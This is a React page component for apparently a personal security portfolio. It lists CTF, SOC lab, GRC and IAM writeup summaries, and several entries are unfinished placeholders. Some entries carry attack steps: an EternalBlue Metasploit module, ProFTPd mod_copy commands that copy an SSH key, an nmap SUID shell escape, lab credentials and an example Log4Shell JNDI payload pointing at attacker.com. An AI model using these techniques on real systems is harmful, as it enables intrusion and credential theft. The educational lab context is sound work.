import { useState } from 'react'
import WriteupCard from '../components/WriteupCard.jsx'

const ALL_WRITEUPS = [
  // ── CTF / Platforms ─────────────────────────────────────────
  {
    title: 'The Zoo — Malware Analysis Challenge',
    category: 'Malware Analysis',
    difficulty: 'Hard',
    platform: 'The Zoo / GitHub',
    date: '2025',
    summary: 'Analysis of live malware samples from The Zoo (github.com/ytisf/theZoo), an open-source malware repository used for research and education. Samples detonated in isolated Debian VM with network monitoring. Covers static analysis (strings, PE headers, imports), dynamic analysis (process monitor, network captures), and MITRE ATT&CK TTP mapping.',
    findings: [
      'Static analysis: identified suspicious imports (VirtualAllocEx, CreateRemoteThread) indicating process injection capability',
      'Dynamic analysis: C2 beacon observed at 30-second intervals to hardcoded IP — DNS over HTTPS used to evade standard DNS monitoring',
      'PE header anomaly: compilation timestamp set to 1970-01-01 — anti-forensic timestomping technique (MITRE T1070.006)',
      'MITRE techniques identified: T1055 (Process Injection), T1071.004 (DNS C2), T1070.006 (Timestomping), T1082 (System Information Discovery)',
    ],
    tools: ['PEStudio', 'Strings', 'Wireshark', 'Process Monitor', 'VirusTotal', 'MITRE ATT&CK', 'Debian VM'],
    accent: '#3b5fd8',
  },
  {
    title: 'TryHackMe — Blue (EternalBlue / MS17-010)',
    category: 'Exploitation',
    difficulty: 'Easy',
    platform: 'TryHackMe',
    date: '2025',
    summary: 'Exploitation of the MS17-010 (EternalBlue) SMB vulnerability on a Windows 7 target. Full attack chain from initial scanning through exploitation to persistence. Documents the vulnerability mechanics, Metasploit module behaviour, and how a properly patched/segmented environment would have blocked each stage.',
    findings: [
      'Nmap scan: ports 135, 139, 445 open — SMB exposed on unpatched Windows 7 (no MS17-010 patch)',
      'Vulnerability confirmed with auxiliary/scanner/smb/smb_ms17_010 — 100% confidence',
      'Exploitation: exploit/windows/smb/ms17_010_eternalblue → SYSTEM shell in 12 seconds',
      'Post-exploitation: hashdump retrieved 4 NTLM hashes including Administrator',
      'Defensive lesson: MS17-010 has been public since 2017 — unpatched SMB on internal network is inexcusable, blocked by network segmentation + patch management',
    ],
    tools: ['Nmap', 'Metasploit', 'EternalBlue', 'Mimikatz', 'Windows 7 Target'],
    accent: '#3b5fd8',
  },
  {
    title: 'TryHackMe — Kenobi (ProFTPd, NFS, SUID)',
    category: 'Privilege Escalation',
    difficulty: 'Easy',
    platform: 'TryHackMe',
    date: '2025',
    summary: 'Linux privilege escalation chain: enumerated NFS shares, exploited ProFTPd 1.3.5 mod_copy vulnerability to steal SSH private key via unauthenticated SITE CPFR/SITE CPTO commands, gained user shell, then escalated to root via SUID binary /usr/bin/menu (PATH variable manipulation).',
    findings: [
      'NFS enumeration: /var share mounted — contained Kenobi SSH private key path via SMB',
      'ProFTPd mod_copy: SITE CPFR /home/kenobi/.ssh/id_rsa → SITE CPTO /var/ftp/id_rsa — unauthenticated file copy to readable NFS share',
      'SSH access as kenobi with stolen private key',
      'SUID binary: /usr/bin/menu calls curl without full path — PATH manipulation to execute malicious "curl" script as root',
      'Root shell achieved via SUID PATH hijack (MITRE T1574.007)',
    ],
    tools: ['Nmap', 'smbclient', 'showmount', 'ProFTPd mod_copy', 'SSH', 'find (SUID)', 'PATH hijack'],
    accent: '#3b5fd8',
  },
  {
    title: 'TryHackMe — Mr Robot (WordPress, Reverse Shell, SUID)',
    category: 'Web + Privilege Escalation',
    difficulty: 'Medium',
    platform: 'TryHackMe',
    date: '2025',
    summary: 'Three-flag challenge on a WordPress site. Dictionary-based credential attack on wp-login, reverse shell via malicious WordPress theme PHP, lateral movement to robot user via MD5 hash crack, root via SUID nmap interactive mode. Classic web-to-root chain demonstrating layered vulnerability compounding.',
    findings: [
      'robots.txt exposed fsocity.dic wordlist and first flag — poor web application hardening',
      'WPScan identified WordPress login — Hydra brute-force with fsocity.dic found credentials: elliot:ER28-0652',
      'Reverse shell: PHP reverse shell injected into WordPress 404 template via Theme Editor — executed on page load',
      'User robot: MD5 hash in /home/robot/password.raw-md5 cracked with hashcat: 822c73956184e093c4dab39d42afafe2 → abcdefghijklmnopqrstuvwxyz',
      'Root: nmap --interactive → !sh — classic SUID nmap privilege escalation (MITRE T1548.001)',
    ],
    tools: ['WPScan', 'Hydra', 'Burp Suite', 'PHP reverse shell', 'Hashcat', 'nmap SUID'],
    accent: '#3b5fd8',
  },
  // ── CyberDefenders ────────────────────────────────────────────
  {
    title: 'CyberDefenders — Tomcat Takeover (Web Shell via HTTP Traffic)',
    category: 'PCAP Analysis',
    difficulty: 'Medium',
    platform: 'CyberDefenders',
    date: '[ TO COMPLETE ]',
    summary: 'Blue team PCAP challenge. Analyze network capture of an Apache Tomcat server compromise. Attacker discovers the /manager endpoint, brute-forces credentials, uploads a malicious WAR file containing a JSP web shell, then executes commands via HTTP POST. Full kill chain visible in the PCAP. Source: cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover',
    findings: [
      '[ TO COMPLETE ] Identify the attacker IP and first reconnaissance packet timestamp',
      '[ TO COMPLETE ] Find the HTTP POST to /manager/html that uploaded the malicious WAR file',
      '[ TO COMPLETE ] Extract the web shell filename deployed on the server',
      '[ TO COMPLETE ] Identify what OS commands the attacker ran via the web shell (look for cmd= parameters)',
      '[ TO COMPLETE ] Determine if the attacker established persistence',
    ],
    tools: ['Wireshark', 'NetworkMiner', 'tshark', 'CyberChef', 'strings'],
    accent: '#3b5fd8',
  },
  {
    title: 'CyberDefenders — PsExec Hunt (Lateral Movement via SMB)',
    category: 'PCAP Analysis',
    difficulty: 'Medium',
    platform: 'CyberDefenders',
    date: '[ TO COMPLETE ]',
    summary: 'Network forensics challenge focused on detecting PsExec lateral movement inside a corporate network. PsExec uses SMB to copy a service binary to ADMIN$ and execute it via the Service Control Manager. The entire chain is visible in SMB2 traffic. Key skill: reading SMB2 protocol in Wireshark. Source: cyberdefenders.org/blueteam-ctf-challenges/psexec-hunt',
    findings: [
      '[ TO COMPLETE ] Identify the source IP initiating the PsExec connection and the target host',
      '[ TO COMPLETE ] Find the SMB2 WRITE request that copied PSEXESVC.exe to the ADMIN$ share',
      '[ TO COMPLETE ] Identify the RPC call that started the PsExec service on the remote host',
      '[ TO COMPLETE ] What command did the attacker run after gaining remote execution?',
      '[ TO COMPLETE ] MITRE ATT&CK: T1021.002 — SMB/Windows Admin Shares. Map full attacker activity',
    ],
    tools: ['Wireshark', 'tshark', 'NetworkMiner', 'MITRE ATT&CK Navigator'],
    accent: '#3b5fd8',
  },
  {
    title: 'CyberDefenders — Lespion (OSINT and Network Forensics)',
    category: 'OSINT',
    difficulty: 'Easy',
    platform: 'CyberDefenders',
    date: '[ TO COMPLETE ]',
    summary: 'OSINT challenge combining social media investigation with network forensics. Investigate a GitHub profile, LinkedIn account, and image EXIF metadata to identify and attribute a suspect. Covers username correlation, geolocation, and passive reconnaissance — skills directly applicable to threat actor attribution in SOC/CTI roles. Source: cyberdefenders.org/blueteam-ctf-challenges/lespion',
    findings: [
      '[ TO COMPLETE ] Enumerate the suspect GitHub username and all public repositories',
      '[ TO COMPLETE ] Extract EXIF metadata from attached image — identify GPS coordinates and timestamp',
      '[ TO COMPLETE ] Find the suspect LinkedIn profile and confirm employment history',
      '[ TO COMPLETE ] Correlate GitHub commit email with other online identities',
      '[ TO COMPLETE ] Identify what sensitive information was leaked in the GitHub repositories',
    ],
    tools: ['ExifTool', 'GitHub OSINT', 'Google Maps', 'Maltego (free tier)', 'LinkedIn'],
    accent: '#3b5fd8',
  },
  // ── LetsDefend ────────────────────────────────────────────────
  {
    title: 'LetsDefend — SOC154: Log4J RCE Exploitation Detected (CVE-2021-44228)',
    category: 'Incident Response',
    difficulty: 'Hard',
    platform: 'LetsDefend',
    date: '[ TO COMPLETE ]',
    summary: 'SOC alert investigation for Log4Shell (CVSS 10.0). Attacker sends a JNDI lookup string in an HTTP header — vulnerable Log4j versions execute the LDAP callback and run arbitrary code. Full SOC workflow: triage the SIEM alert, analyze the raw HTTP request, pivot on the attacker IP, determine impact, write escalation decision. Source: app.letsdefend.io — search SOC154',
    findings: [
      '[ TO COMPLETE ] Identify the malicious JNDI payload in the HTTP headers (e.g. ${jndi:ldap://attacker.com/exploit})',
      '[ TO COMPLETE ] Was the exploitation successful? Did the server make an outbound LDAP connection?',
      '[ TO COMPLETE ] Run the attacker IP through AbuseIPDB and VirusTotal — document reputation',
      '[ TO COMPLETE ] Determine the scope: which Log4j version and which service was vulnerable',
      '[ TO COMPLETE ] Write the escalation decision: True Positive or False Positive, severity, and recommended containment',
    ],
    tools: ['LetsDefend SIEM', 'AbuseIPDB', 'VirusTotal', 'CyberChef', 'MITRE T1190'],
    accent: '#3b5fd8',
  },
  {
    title: 'LetsDefend — SOC109: Emotet Malware Detected',
    category: 'Malware Analysis',
    difficulty: 'Medium',
    platform: 'LetsDefend',
    date: '[ TO COMPLETE ]',
    summary: 'SOC alert for Emotet, the most prolific malware loader of 2020-2023. Arrives as a malicious Word document with VBA macros. On execution: PowerShell downloads the Emotet DLL, injects into a legitimate Windows process, then attempts lateral movement and downloads Cobalt Strike or ransomware. Covers email forensics, macro analysis, network IOC extraction, and ATT&CK mapping. Source: app.letsdefend.io — search SOC109',
    findings: [
      '[ TO COMPLETE ] Analyze phishing email headers — sender, spoofed domain, originating IP',
      '[ TO COMPLETE ] Extract the malicious Word attachment and identify VBA macro behavior (use olevba)',
      '[ TO COMPLETE ] Find the PowerShell command that downloads the Emotet payload (likely base64-encoded)',
      '[ TO COMPLETE ] Identify the C2 IP/domain the Emotet binary contacted after execution',
      '[ TO COMPLETE ] MITRE ATT&CK: T1566.001 (Spearphishing), T1059.001 (PowerShell), T1055 (Process Injection)',
    ],
    tools: ['LetsDefend SIEM', 'olevba', 'Any.run sandbox', 'VirusTotal', 'CyberChef', 'MITRE ATT&CK'],
    accent: '#3b5fd8',
  },
  // ── BTLO ──────────────────────────────────────────────────────
  {
    title: 'BTLO — Phishing Analysis (Email Header Forensics and IOC Extraction)',
    category: 'Incident Response',
    difficulty: 'Easy',
    platform: 'BTLO',
    date: '[ TO COMPLETE ]',
    summary: 'Blue Team Labs Online phishing investigation. Parse raw email headers to trace the routing path, verify SPF/DKIM/DMARC, extract and defang URLs, analyze the linked phishing page, and produce a structured IOC report. Foundational SOC Tier-1 skill tested by every Big 4 and MSSP in Poland. Source: blueteamlabs.online — Phishing Analysis (free)',
    findings: [
      '[ TO COMPLETE ] Extract all email headers — identify originating IP and mail server hops',
      '[ TO COMPLETE ] Check SPF, DKIM, DMARC results — which failed and what does that indicate?',
      '[ TO COMPLETE ] Defang all URLs and analyze with VirusTotal and URLScan.io',
      '[ TO COMPLETE ] Identify the phishing kit hosting provider and ASN',
      '[ TO COMPLETE ] Produce structured IOC report: IPs, domains, URLs, file hashes',
    ],
    tools: ['MXToolbox', 'EmailHeaders.net', 'VirusTotal', 'URLScan.io', 'AbuseIPDB', 'CyberChef'],
    accent: '#3b5fd8',
  },
  // ── GRC Writeups ──────────────────────────────────────────────
  {
    title: 'DORA Article 18 Incident Classification — Worked Example',
    category: 'GRC Audit Writeup',
    difficulty: 'N/A',
    platform: 'Original Research',
    date: 'Jun 2026',
    summary: 'Step-by-step walkthrough of classifying a payment gateway outage under DORA Article 18 and the EBA/EIOPA/ESMA Joint RTS on major ICT incident reporting. 145,000 clients affected, EUR 250,000 economic impact, payment transactions disrupted — three criteria triggered simultaneously. Produces Article 19 KNF initial report template with 4-hour deadline.',
    findings: [
      'Three Article 18 criteria triggered: clients >= 100,000, economic impact >= EUR 100,000, payment transactions disrupted',
      'The 4-hour initial report deadline begins at classification, not detection',
      'Cross-border spread criterion: applies to geographic spread of impact, not entity location',
      'EBA RTS Article 2(2): "critical services" definition under DORA is narrower than ITSM definitions',
    ],
    tools: ['DORA Art. 18', 'EBA/EIOPA/ESMA Joint RTS', 'Python classification engine', 'SQLite'],
    accent: '#2563eb',
  },
  {
    title: 'Article 30 Contractual Compliance Audit — AWS MSA',
    category: 'GRC Audit Writeup',
    difficulty: 'N/A',
    platform: 'Original Research',
    date: 'Jun 2026',
    summary: 'Third-party contractual compliance review of the AWS MSA against all 11 mandatory provisions of DORA Article 30. Three missing provisions identified. IIA 4E format finding with remediation timeline.',
    findings: [
      'Missing: audit rights for KNF as competent authority',
      'Missing: sub-outsourcing approval requirement',
      'Missing: DORA compliance clause (contract predates January 2025)',
      'Article 30(3): KNF guidance suggests 6-month renegotiation window from January 2025',
    ],
    tools: ['DORA Art. 30', 'KNF Supervisory Guidelines', 'Python (checklist engine)'],
    accent: '#2563eb',
  },
  // ── IAM Writeups ──────────────────────────────────────────────
  {
    title: 'Privileged Access Review — 47 Orphaned Accounts in Active Directory',
    category: 'IAM Investigation',
    difficulty: 'N/A',
    platform: 'DORA Platform Demo',
    date: 'Jun 2026',
    summary: 'Root cause analysis of 47 unmatched privileged accounts discovered during access review. HR-AD integration broken for 18 months following HRIS migration. Full IIA 4E finding with emergency remediation plan.',
    findings: [
      '47 active privileged accounts could not be matched to current employees',
      'Access review last completed 18 months ago — required annually under DORA Art. 9(4)(c)',
      'Root cause: HRIS migration broke HR-AD integration, no formal process owner assigned',
      'Remediation: disable all 47 unmatched accounts within 14 days pending verification',
    ],
    tools: ['Active Directory', 'PowerShell', 'Entra ID Platform', 'IIA 4E', 'DORA Art. 9(4)(c)'],
    accent: '#0891b2',
  },
]

const CATEGORIES = ['All', 'PCAP Analysis', 'Incident Response', 'Malware Analysis', 'OSINT', 'Exploitation', 'Privilege Escalation', 'Web + Privilege Escalation', 'Detection Engineering', 'SOC Analysis', 'Threat Investigation', 'GRC Audit Writeup', 'IAM Investigation']
const PLATFORMS  = ['All', 'CyberDefenders', 'LetsDefend', 'BTLO', 'TryHackMe', 'The Zoo / GitHub', 'DeceptionGrid Lab', 'ControlProbe Lab', 'SentinelForge Lab', 'DORA Platform Demo', 'Original Research']

export default function Writeups() {
  const [category, setCategory] = useState('All')
  const [platform, setPlatform] = useState('All')

  const filtered = ALL_WRITEUPS.filter(w =>
    (category === 'All' || w.category === category) &&
    (platform === 'All' || w.platform === platform)
  )

  return (
    <div style={{ maxWidth: 1100, margin: '0 auto', padding: '64px 24px 96px' }}>

      <div style={{ marginBottom: 48 }}>
        <div style={{ fontSize: '0.62rem', fontWeight: 700, letterSpacing: '0.14em', textTransform: 'uppercase', color: 'var(--write)', marginBottom: 10 }}>
          Writeups
        </div>
        <h1 style={{ fontSize: 'clamp(1.6rem, 4vw, 2.4rem)', fontWeight: 700, letterSpacing: '-0.03em', color: 'var(--text)', marginBottom: 14 }}>
          Investigations & Writeups
        </h1>
        <p style={{ fontSize: '0.9rem', color: 'var(--text2)', maxWidth: 580, lineHeight: 1.7 }}>
          CTF walkthroughs, malware analysis, GRC audit findings, IAM investigations, and SOC lab writeups.
          All detections are from real lab traffic.
        </p>
      </div>

      {/* Filters */}
      <div style={{ display: 'flex', gap: 12, marginBottom: 36, flexWrap: 'wrap' }}>
        <div>
          <div style={{ fontSize: '0.6rem', fontWeight: 700, letterSpacing: '0.1em', textTransform: 'uppercase', color: 'var(--text3)', marginBottom: 6 }}>
            Category
          </div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
            {CATEGORIES.map(c => (
              <button key={c} onClick={() => setCategory(c)} style={{
                padding: '5px 12px', borderRadius: 4,
                border: `1px solid ${category === c ? 'rgba(20,184,166,0.4)' : 'var(--border2)'}`,
                background: category === c ? 'rgba(20,184,166,0.1)' : 'var(--surface)',
                color: category === c ? 'var(--write)' : 'var(--text2)',
                fontSize: '0.72rem', fontWeight: 500, cursor: 'pointer',
                transition: 'all 0.15s',
              }}>{c}</button>
            ))}
          </div>
        </div>
      </div>

      {/* Stats bar */}
      <div style={{
        display: 'flex', gap: 24, marginBottom: 32,
        padding: '12px 18px', background: 'var(--surface)',
        border: '1px solid var(--border)', borderRadius: 6,
        fontSize: '0.75rem', color: 'var(--text2)',
      }}>
        <span>Showing <strong style={{ color: 'var(--text)' }}>{filtered.length}</strong> of {ALL_WRITEUPS.length} writeups</span>
        <span style={{ color: 'var(--text3)' }}>|</span>
        <span>PCAP: {ALL_WRITEUPS.filter(w => w.category === 'PCAP Analysis').length}</span>
        <span>IR: {ALL_WRITEUPS.filter(w => w.category === 'Incident Response').length}</span>
        <span>Malware: {ALL_WRITEUPS.filter(w => w.category === 'Malware Analysis').length}</span>
        <span>CTF: {ALL_WRITEUPS.filter(w => ['Exploitation','Privilege Escalation','Web + Privilege Escalation'].includes(w.category)).length}</span>
        <span>GRC: {ALL_WRITEUPS.filter(w => w.category === 'GRC Audit Writeup').length}</span>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {filtered.length > 0 ? filtered.map(w => (
          <WriteupCard key={w.title} {...w} />
        )) : (
          <div style={{
            padding: '48px', textAlign: 'center',
            color: 'var(--text3)', fontSize: '0.85rem',
            border: '1px dashed var(--border)', borderRadius: 8,
          }}>
            No writeups match the selected filters.
          </div>
        )}
      </div>

      {/* Add more CTA */}
      <div style={{
        marginTop: 48, padding: '24px 28px',
        background: 'var(--surface)', border: '1px dashed var(--border2)',
        borderRadius: 8, textAlign: 'center',
      }}>
        <div style={{ fontSize: '0.8rem', color: 'var(--text3)', marginBottom: 8 }}>
          More writeups being added continuously.
        </div>
        <a href="https://github.com/sajancr3" target="_blank" rel="noreferrer" style={{
          fontSize: '0.78rem', fontWeight: 600, color: 'var(--write)',
          display: 'inline-flex', alignItems: 'center', gap: 6,
        }}>
          See all projects on GitHub
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
            <path d="M2 10L10 2M10 2H4M10 2v6" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </a>
      </div>

    </div>
  )
}
